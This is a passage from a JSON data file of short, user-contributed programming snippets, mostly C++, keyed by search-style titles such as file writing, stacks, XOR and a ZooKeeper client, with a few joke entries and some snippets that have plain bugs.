    "description": "#ifndef EMPLOYEE_H #define EMPLOYEE_H #include <string> using namespace std;   class Employee { private:     string name;        // Employee name     string number;      // Employee number     string hireDate;    // Hire date   public:     // Default constructor     Employee()         { name = \"\"; number = \"\"; hireDate = \"\"; }       // Constructor     Employee(string aName, string aNumber, string aDate)         { name = aName; number = aNumber; hireDate = aDate; }       // Mutators     void setName(string n)         { name = n; }       void setNumber(string num)         { number = num; }       void setHireDate(string date)         { hireDate = date; }       // Accessors     string getName() const         { return name; }       string getNumber() const         { return number; }       string getHireDate() const         { return hireDate; } };   #endif \n",
    "reg_date": "2021-10-12T11:44:32.000Z"
  },
  {
    "id": 4309,
    "keyword": null,
    "link": null,
    "title": " working with char and string c++",
    "description": " // syntax:  // char <variable-name>[] = { '<1st-char>',  '<2nd-char>', ... , '<Nth-char>', '\\0'};   // example (to store 'Hello' in the YourVar variable):  char YourVar[] = {'H','e','l','l','o','\\0'}; // NOTE: the \\0 marks the end of the char array \nString and Char\n",
    "reg_date": "2021-10-12T11:44:32.000Z"
  },
  {
    "id": 4310,
    "keyword": null,
    "link": null,
    "title": " write a c++ program that reads ten strings and store them in array of strings, sort them and finally print the sorted strings",
    "description": "void sortString(string &str)  {     sort(str.begin(), str.end());     cout << str;  }     // Driver program to test above function  int main()  {      string s = \"geeksforgeeks\";       sortString(s);       return 0;  }  \n",
    "reg_date": "2021-10-12T11:44:33.000Z"
  },
  {
    "id": 4311,
    "keyword": null,
    "link": null,
    "title": " write a code that adds two number",
    "description": "#include<iostream> int main() { \tint num1=0,int num2=0;\t \tint sum=0; \tcin>>num1; \tcin>>num2; \tsum=num1+num2; \tstd::cout<<sum; \treturn 0;\t }\n",
    "reg_date": "2021-10-12T11:44:33.000Z"
  },
  {
    "id": 4312,
    "keyword": null,
    "link": null,
    "title": " write a program that simulates the rolling of two dice in c++",
    "description": "#include<iostream> #include<cstdlib> #include<ctime>  #include<iomanip> #include<vector> #include<cmath> #include<algorithm>    int main( ) {     std::cout << \"enter seeding number: \" ;      int num_seed = 0 ;     std::cin >> num_seed ;     srand( num_seed ) ;     std::cout << \"enter numbers of tries: \";     int tries = 0 ;     std::cin >> tries ;     std::cout << \"enter numbers of asterikes: \";      int asterikes = 0 ;     std::cin >> asterikes ;      double sum_of_three_dices , average_of_three_dices,sigme_dices_powered, variation, standard_dev = 0.0 ;     std::vector<size_t> vec_of_three_dice(19,0);     for(size_t i = 0; i < tries ; i++)     {         int dice_one = rand()%6 + 1 ;         int dice_two = rand()%6 + 1 ;         int dice_three = rand()%6 + 1 ;         vec_of_three_dice[dice_one + dice_two + dice_three] += 1 ;         sum_of_three_dices += dice_one + dice_two +dice_three ;         average_of_three_dices = sum_of_three_dices / tries ;         sigme_dices_powered += pow(dice_one + dice_two + dice_three ,2);         variation = sigme_dices_powered/tries - pow(average_of_three_dices,2);         standard_dev = sqrt(variation);     }      average_of_three_dices = sum_of_three_dices / tries ;     std::cout << \"average_of_three_dices is: \" <<std::fixed << std::setprecision(3) << average_of_three_dices << std::endl;     std::cout << \"standard deviation is: \" <<std::fixed << std::setprecision(3) << standard_dev << std::endl;     std::cout << std::endl;          int max_value = *max_element(vec_of_three_dice.begin(),vec_of_three_dice.end());     for(size_t i = 3; i <vec_of_three_dice.size() ; i ++ ){         if(i < 10 ){             std::cout <<std::setw(2) <<std::setfill(' ') << i<< \" : \" <<\"(\"<<std::setw(4)<<std::setfill(' ')<<vec_of_three_dice.at(i) << \")\" ;         }else{             std::cout << i << \" : \" <<\"(\"<<std::setw(4)<<std::setfill(' ')<<vec_of_three_dice.at(i) << \")\";         }        for(size_t j = 0; j <= static_cast<size_t>(vec_of_three_dice.at(i) * asterikes)/max_value ; j++ ){            std::cout << \"*\";        }         std::cout << std::endl;       }             return 0 ; }\n",
    "reg_date": "2021-10-12T11:44:33.000Z"
  },
  {
    "id": 4313,
    "keyword": null,
    "link": null,
    "title": " write a program to implement stack using array",
    "description": "#include <iostream> using namespace std; int stack[100], n=100, top=-1; void push(int val) {    if(top>=n-1)    cout<<\"Stack Overflow\"<<endl;    else {       top++;       stack[top]=val;    } } void pop() {    if(top<=-1)    cout<<\"Stack Underflow\"<<endl;    else {       cout<<\"The popped element is \"<< stack[top] <<endl;       top--;    } } void display() {    if(top>=0) {       cout<<\"Stack elements are:\";       for(int i=top; i>=0; i--)       cout<<stack[i]<<\" \";       cout<<endl;    } else    cout<<\"Stack is empty\"; } int main() {    int ch, val;    cout<<\"1) Push in stack\"<<endl;    cout<<\"2) Pop from stack\"<<endl;    cout<<\"3) Display stack\"<<endl;    cout<<\"4) Exit\"<<endl;    do {       cout<<\"Enter choice: \"<<endl;       cin>>ch;       switch(ch) {          case 1: {             cout<<\"Enter value to be pushed:\"<<endl;             cin>>val;             push(val);             break;          }          case 2: {             pop();             break;          }          case 3: {             display();             break;          }          case 4: {             cout<<\"Exit\"<<endl;             break;          }          default: {             cout<<\"Invalid Choice\"<<endl;          }       }    }while(ch!=4);    return 0; }\n",
    "reg_date": "2021-10-12T11:44:33.000Z"
  },
  {
    "id": 4314,
    "keyword": null,
    "link": null,
    "title": " write and read string binary file c++",
    "description": "#include <cstring> #include <iostream> #include <fstream> #include <string>  struct player_data {   std::string name;   int score; };  int main() {    std::ofstream savefile(\"score.dat\", std::ios_base::binary);   if(savefile.good())   {     player_data Player1;     Player1.name = \"John Doell\";     Player1.score = 55;     savefile.write(Player1.name.c_str(),Player1.name.size()); // write string to binary file     savefile.write(\"\\0\",sizeof(char)); // null end string for easier reading     savefile.write(reinterpret_cast<char*>(&Player1.score),sizeof(Player1.score)); // write int to binary file     savefile.close();   }    std::ifstream loadfile(\"score.dat\", std::ios_base::binary);   if(loadfile.good())   {     player_data Player1;     std::getline(loadfile,Player1.name,'\\0'); // get player name (remember we null ternimated in binary)     loadfile.read((char*)&Player1.score,sizeof(Player1.score)); // read int bytes     std::cout << \"Player1 name: \" << Player1.name << std::endl;     std::cout << \"Player1 score: \" << Player1.score << std::endl;   }    return 0; }\n",
    "reg_date": "2021-10-12T11:44:33.000Z"
  },
  {
    "id": 4315,
    "keyword": null,
    "link": null,
    "title": " write in file cpp",
    "description": "// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\n#include <iostream> #include <fstream> using namespace std;  ifstream file_variable; //ifstream is for input from plain text files file_variable.open(\"input.txt\"); //open input.txt  file_variable.close(); //close the file stream /* Manually closing a stream is only necessary if you want to re-use the same stream variable for a different file, or want to switch from input to output on the same file. */ _____________________________________________________ //You can also use cin if you have tables like so: while (cin >> name >> value)// you can also use the file stream instead of this {  cout << name << value << endl; } _____________________________________________________ //ifstream file_variable; //ifstream is for input from plain text files ofstream out_file; out_file.open(\"output.txt\");  out_file << \"Write this scentence in the file\" << endl;\n#include <iostream> #include <fstream> using namespace std; int main() { \tfstream my_file; \tmy_file.open(\"my_file.txt\", ios::out); \tif (!my_file) { \t\tcout << \"File not created!\"; \t} \telse { \t\tcout << \"File created successfully!\"; \t\tmy_file << \"Guru99\"; \t\tmy_file.close(); \t} \treturn 0; } \nofstream myfile; myfile.open(\"file.txt\");  myfile << \"write this to file\"\n",
    "reg_date": "2021-10-12T11:44:33.000Z"
  },
  {
    "id": 4316,
    "keyword": null,
    "link": null,
    "title": " write to file in C++",
    "description": "#include <iostream> #include <fstream> using namespace std;  ifstream file_variable; //ifstream is for input from plain text files file_variable.open(\"input.txt\"); //open input.txt  file_variable.close(); //close the file stream /* Manually closing a stream is only necessary if you want to re-use the same stream variable for a different file, or want to switch from input to output on the same file. */ _____________________________________________________ //You can also use cin if you have tables like so: while (cin >> name >> value)// you can also use the file stream instead of this {  cout << name << value << endl; } _____________________________________________________ //ifstream file_variable; //ifstream is for input from plain text files ofstream out_file; out_file.open(\"output.txt\");  out_file << \"Write this scentence in the file\" << endl;\n#include <iostream> #include <fstream> using namespace std; int main() { \tfstream my_file; \tmy_file.open(\"my_file.txt\", ios::out); \tif (!my_file) { \t\tcout << \"File not created!\"; \t} \telse { \t\tcout << \"File created successfully!\"; \t\tmy_file << \"Guru99\"; \t\tmy_file.close(); \t} \treturn 0; } \n#include<iostream> #include<fstream>  using namespace std;  int main() {   ifstream myReadFile;  myReadFile.open(\"text.txt\");  char output[100];  if (myReadFile.is_open()) {  while (!myReadFile.eof()) {       myReadFile >> output;     cout<<output;    } } myReadFile.close(); return 0; }  \nofstream myfile; myfile.open(\"file.txt\");  myfile << \"write this to file\"\n++ cCopy#include <iostream> #include <fstream>  using std::cout; using std::ofstream; using std::endl; using std::string; using std::fstream;  int main() {     string filename(\"tmp.txt\");     fstream file_out;      file_out.open(filename, std::ios_base::out);     if (!file_out.is_open()) {         cout << \"failed to open \" << filename << '\\n';     } else {         file_out << \"Some random text to write.\" << endl;         cout << \"Done Writing!\" << endl;     }      return EXIT_SUCCESS; } \n",
    "reg_date": "2021-10-12T11:44:33.000Z"
  },
  {
    "id": 4317,
    "keyword": null,
    "link": null,
    "title": " x += c++",
    "description": "int main () {   int a, b=3;   a = b;   a+=2;             // equivalent to a=a+2   cout << a; }\n",
    "reg_date": "2021-10-12T11:44:33.000Z"
  },
  {
    "id": 4318,
    "keyword": null,
    "link": null,
    "title": " xor in c++",
    "description": "int a = 5;     // 0101b  (0x05) int b = 9;     // 1001b  (0x09) int c = a ^ b; // 1100b  (0x0C)  std::cout << \"a = \" << a << \", b = \" << b << \", c = \" << c << std::endl; \n",
    "reg_date": "2021-10-12T11:44:33.000Z"
  },
  {
    "id": 4319,
    "keyword": null,
    "link": null,
    "title": " yearly interest calculator c++  using for loop",
    "description": "#include <iostream> #include <cmath> #include <iomanip> using namespace std;  void main() { // Inputs //  double princ = 0.0; double rate = 0.0; int years = 0; int year = 1; double total = 0.0;  // Ask User For INFO //  cout << \"What is the principle? \"; cin >> princ; cout << \"What is the rate in decimal? \"; cin >> rate; cout << \"how many years? \"; cin >> years;    for (double total; total = princ*(1+rate)*year;) { cout << \"The balance after year \" << year << \" is \"<< total << endl << endl; year += 1; }  while((years + 1)!= year);  system(\"pause\"); } \n",
    "reg_date": "2021-10-12T11:44:33.000Z"
  },
  {
    "id": 4320,
    "keyword": null,
    "link": null,
    "title": " yeet",
    "description": "yeet!\nfeetus\ndeleetus \nSTFU\nyeetus \nprint(\"yeet\") print(\"yeet\") print(\"yeet\") print(\"yeet\") print(\"yeet\") print(\"yeet\") print(\"yeet\") v print(\"yeet\")vprint(\"yeet\")v print(\"yeet\")print(\"yeet\") vprint(\"yeet\")vprint(\"yeet\")print(\"yeet\")   SIKE LOLZahja u\n//YEEEEETTTTT\nyeet\nfa;jjjjjjjjjjslkdfj;;;;;;;;a;;;;;;;sklsa;dfsdddddda;;;lskd;;fjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj;aalsskddfjjjja;;;slllllkddddddjfffa;;;;;skkkdjjjjffffffa;lskdfjjjjjj;alss;ks;aa;slkddddkkkkkkfhjhjdda;lsaskdfja;lsssssssssssssssss;aaassssa;;aaaaaaaaaaasssssssa;;a;lll;a;;aa;;;;;;;;;;;;a;;lsdkffjjjj;asl;kdfjjja;skldfkja;sklfjaf;kladsjf;kladsjflk\n",
    "reg_date": "2021-10-12T11:44:34.000Z"
  },
  {
    "id": 4321,
    "keyword": null,
    "link": null,
    "title": " young physicist codeforces",
    "description": "#include <bits/stdc++.h>using namespace std;#define SPEED ios::sync_with_stdio(false); cin.tie(0); cout.tie(0)#define ll long long#define fi first#define se second#define mp make_pair#define pb push_back#define eb emplace_backll gcd(ll a,ll b){    if(a==0)        return b;    else        return gcd(b%a,a);}ll findGCD(vector<ll> arr,ll n) {     ll result = arr[0];     for (ll i = 1; i < n; i++)         result = gcd(arr[i], result);    return result; }int main() {    SPEED;    cout.precision(8);    cout << fixed;    ll t;    cin>>t;    ll sum=0;    ll sx=0;    ll sy=0;    ll sz=0;    for(ll i=0;i<t;i++){        ll tx,ty,tz;        cin>>tx>>ty>>tz;        sx+=tx;        sy+=ty;        sz+=tz;    }    if(sx==0 && sy==0 && sz==0) cout<<\"YES\";    else cout<<\"NO\";    return 0;}\n",
    "reg_date": "2021-10-12T11:44:34.000Z"
  },
  {
    "id": 4322,
    "keyword": null,
    "link": null,
    "title": " youtube",
    "description": "think twice, You can be trapped for couple of hours instead of coding\nYou're supposed to be doing something arn't you...\ngo back to coding\nONLY use for programming help. Do not get distracted!\n// I hope you're about to search solutions for your code and not watch PewDiePie\nd i s t r a c t i o n s\nGo Coding my Friend :)\nProcrastinating is like masterbaiting, in the end your only screwing yourself. get back to programming.\n #dont waste time get back to codin\n//Are you trying to watch a video? go back to coding!\n",
    "reg_date": "2021-10-12T11:44:34.000Z"
  },
  {
    "id": 4323,
    "keyword": null,
    "link": null,
    "title": " youtube premium",
    "description": "You don't need that. Trust me.\n",
    "reg_date": "2021-10-12T11:44:34.000Z"
  },
  {
    "id": 4324,
    "keyword": null,
    "link": null,
    "title": " z function cp algorithm",
    "description": "vector<int> z_function(string s) {     int n = (int) s.length();     vector<int> z(n);     for (int i = 1, l = 0, r = 0; i < n; ++i) {         if (i <= r)             z[i] = min (r - i + 1, z[i - l]);         while (i + z[i] < n && s[z[i]] == s[i + z[i]])             ++z[i];         if (i + z[i] - 1 > r)             l = i, r = i + z[i] - 1;     }     return z; } \n",
    "reg_date": "2021-10-12T11:44:34.000Z"
  },
  {
    "id": 4325,
    "keyword": null,
    "link": null,
    "title": " z transfrom mathlab",
    "description": "syms n f = sin(n); ztrans(f)\n",
    "reg_date": "2021-10-12T11:44:34.000Z"
  },
  {
    "id": 4326,
    "keyword": null,
    "link": null,
    "title": " zeros of array c++",
    "description": "int A[5]; // Entries remain uninitialized int B[5]= { 0 }; // All entries set to zero\n",
    "reg_date": "2021-10-12T11:44:34.000Z"
  },
  {
    "id": 4327,
    "keyword": null,
    "link": null,
    "title": " zookeeper c++ example",
    "description": "#include <zk/client.hpp> #include <zk/multi.hpp> #include <zk/server/configuration.hpp> #include <zk/server/server.hpp>  #include <exception> #include <iostream>  /** All result types are printable for debugging purposes. **/ template <typename T> void print_thing(const zk::future<T>& result) {     try     {         // Unwrap the future value, which will not block (based on usage), but could throw.         T value(result.get());         std::cerr << value << std::endl;     }     catch (const std::exception& ex)     {         // Error \"handling\"         std::cerr << \"Exception: \" << ex.what() << std::endl;     } }  int main() {     // Start a ZK server running on localhost (not needed if you just want a client, but great for testing and     // demonstration purposes).     zk::server::server server(zk::server::configuration::make_minimal(\"zk-data\", 2181));      // zk::client::connect returns a future<zk::client>, which is delivered when the connection is established.     auto client = zk::client::connect(\"zk://127.0.0.1:2181\")                              .get();      // get_result has a zk::buffer and zk::stat.     client.get(\"/foo/bar\")         .then(print_thing<zk::get_result>);      // get_children_result has a std::vector<std::string> for the path names and zk::stat for the parent stat.     client.get_children(\"/foo\")         .then(print_thing<zk::get_children_result>);      // set_result has a zk::stat for the modified ZNode.     client.set(\"/foo/bar\", \"some data\")         .then(print_thing<zk::set_result>);      // More explicit: client.create(\"/foo/baz\", \"more data\", zk::acls::open_unsafe(), zk::create_mode::normal);     client.create(\"/foo/baz\", \"more data\")         .then(print_thing<zk::create_result>);      client.get(\"/foo/bar\")         .then([client] (const auto& get_res)         {             zk::version foo_bar_version = get_res.get().stat().data_version;              zk::multi_op txn =             {                 zk::op::check(\"/foo\", zk::version::any()),                 zk::op::check(\"/foo/baz\", foo_bar_version),                 zk::op::create(\"/foo/bap\", \"hi\", nullopt, zk::create_mode::sequential),                 zk::op::erase(\"/foo/bzr\"),             };              // multi_res's type is zk::future<zk::multi_result>             client.commit(txn).then(print_thing<zk::multi_result>);         });      // This is not strictly needed -- a client falling out of scope will auto-trigger close     client.close(); } \n",
    "reg_date": "2021-10-12T11:44:34.000Z"
  }
]